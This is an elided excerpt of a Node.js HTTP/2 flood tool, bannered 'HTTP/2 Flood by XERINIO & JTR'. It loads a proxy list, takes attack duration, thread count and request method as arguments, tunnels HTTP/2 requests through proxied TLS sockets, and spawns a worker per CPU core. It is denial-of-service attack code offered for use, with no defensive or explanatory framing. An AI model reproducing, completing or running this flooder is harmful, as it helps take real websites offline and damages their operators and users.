...
try {
var proxies = fs.readFileSync("all.txt", 'utf-8').toString().replace(/\r/g, '').split('\n');
} catch(error){
...
if (!process.argv[3] || isNaN(process.argv[3])) {
    console.log('Time is not specified.');
    process.exit();
}

if (process.argv[4] && isNaN(process.argv[4])) {
    console.log('Invalid threads');
    process.exit();
}

if (process.argv[5] && (process.argv[5].toUpperCase() != 'GET' && process.argv[5].toUpperCase() != 'POST')) {
    console.log('Invalid method (GET, POST)');
    process.exit();
}
...
class TlsBuilder {
    ...
    http2TUNNEL(socket){
        ...
        payload[":method"] = process.argv[5] ? process.argv[5].toUpperCase() : "GET";
...
let threads = process.argv[4] ? process.argv[4] : cpus().length;
if (cluster.isPrimary) {
  console.log('HTTP/2 Flood by XERINIO & JTR');
